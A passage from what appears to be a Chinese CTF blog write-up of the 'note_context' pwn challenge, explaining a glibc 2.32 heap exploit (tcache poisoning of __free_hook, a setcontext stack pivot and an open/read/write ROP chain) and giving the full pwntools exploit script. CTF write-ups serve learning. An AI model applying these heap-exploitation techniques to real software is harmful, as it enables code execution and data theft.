class="number">0x10</span></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(chunk8_addr+<span class="number">0x10</span>)+cyclic(<span class="number">0x10</span>)+p64(setcontext_addr)</span><br></pre></td></tr></table></figure>

<p>chunk8_addr是包括了chunk头的首地址</p>
<p>这里主要来详细讲一下payload的构造 flag字符串是为了接下来的orw</p>
<p>第一条指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]</span><br></pre></td></tr></table></figure>

<p>此时rdi指向的是chunk8_addr+0x10的地址 再加8 也就是指向了chunk8_addr+0x18</p>
<p>取这个地址的值赋值给rdx 也就是在flag字符串后我们要存入想要控制的rdx值 这里选择是chunk8_addr+0x10 </p>
<p>在接下来的setcontext rsp指针就会被赋值到chunk8_addr+0xb0 我们只要在那里进行下一步的构造即可</p>
<p>第二条指令没啥用 不用关注 看第三条</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call qword ptr [rdx + 0x20]</span><br></pre></td></tr></table></figure>

<p>此时的rdx对应的值为chunk8_addr+0x18 也就是说 setcontext的地址要被放到chunk8_addr+0x38处</p>
<p>随后 我们用垃圾数据填充 来到chunk8_addr + 0xb0处继续开始构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(chunk8_addr+<span class="number">0x10</span>)+cyclic(<span class="number">0x10</span>)+p64(setcontext_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk8_addr+<span class="number">0x10</span>+<span class="number">0xa8</span>)+p64(ret_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(write_addr)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303202013150.png" alt="image-20230320201353081"></p>
<p>此时rcx的值是我们存入的ret指令 并且执行完push后 栈上会存放两个ret</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303202015813.png" alt="image-20230320201502749"></p>
<p>接下来一直执行到setcontext的ret指令的时候 就会将栈上的ret弹入到rip寄存器中 顺延执行到pop rdi</p>
<p>我们就成功控制了程序执行流 成功获取flag</p>
<p>完整exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28793)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;5. Exit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;5. Exit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;5. Exit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;5. Exit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x800</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x7f0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1</span>-<span class="number">96</span></span><br><span class="line">libc_addr = main_arena_addr - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x900</span>)</span><br><span class="line">edit(<span class="number">0</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">mp_tcache_bins = libc_addr + <span class="number">0x1e32d0</span></span><br><span class="line">success(<span class="string">&quot;mp_tcache_bins :&quot;</span>+<span class="built_in">hex</span>(mp_tcache_bins))</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x900</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">key = ( heap_addr + <span class="number">0x3000</span> ) &gt;&gt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">6</span>,p64(key^(free_hook)))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x900</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]</span></span><br><span class="line">ret_addr = libc_addr + <span class="number">0x26699</span></span><br><span class="line">rdi_addr = libc_addr + <span class="number">0x2858f</span></span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x2ac3f</span></span><br><span class="line">rdx_r12_addr = libc_addr + <span class="number">0x114161</span></span><br><span class="line">rax_addr = libc_addr + <span class="number">0x45580</span></span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">gadget_addr = libc_addr + <span class="number">0x000000000014b760</span></span><br><span class="line">chunk8_addr = heap_addr +<span class="number">0x36e0</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(chunk8_addr))</span><br><span class="line">flag_addr = chunk8_addr + <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(chunk8_addr+<span class="number">0x10</span>)+cyclic(<span class="number">0x10</span>)+p64(setcontext_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk8_addr+<span class="number">0x10</span>+<span class="number">0xa8</span>)+p64(ret_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(write_addr)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">edit(<span class="number">9</span>,p64(gadget_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(gadget_addr))</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>

<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/01/27/SROP/">← Next SROP</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/01/01/iofile%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80/">iofile泄露libc基址 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307062245113.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>Dr.chen</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#orw"><span class="toc-number">1.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-shellcode"><span class="toc-number">2.</span> <span class="toc-text">simple_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fast-note"><span class="toc-number">3.</span> <span class="toc-text">fast_note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#new-fast-note"><span class="toc-number">4.</span> <span class="toc-text">new_fast_note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#YukkuriSay"><span class="toc-number">5.</span> <span class="toc-text">YukkuriSay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#note-context"><span class="toc-number">6.</span> <span class="toc-text">note_context</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>